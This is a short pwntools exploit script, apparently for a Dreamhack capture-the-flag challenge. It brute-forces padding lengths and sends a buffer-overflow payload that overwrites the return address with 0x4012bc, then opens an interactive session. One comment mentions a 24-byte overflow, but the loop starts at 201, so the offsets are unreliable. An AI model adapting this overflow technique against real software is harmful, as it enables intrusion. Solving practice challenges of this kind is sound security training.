from pwn import *

for i in range(201, 1001):
    print(f"Try {i}")
    #p = remote("host3.dreamhack.games", 10626)
    p = process('steam-run ./a/chall', shell=True)

    p.recvuntil("Menu: ".encode())

    p.sendline('cherry'.encode())

    p.recvuntil("Is it cherry?: ".encode())

    # return address: 0x00000000004012bc
    # 24 바이트 오버플로우

    payload = b"A" * i + p64(0x4012bc)

    p.sendline(payload)

    p.interactive()

    p.close()

    print('\n\n\n\n')
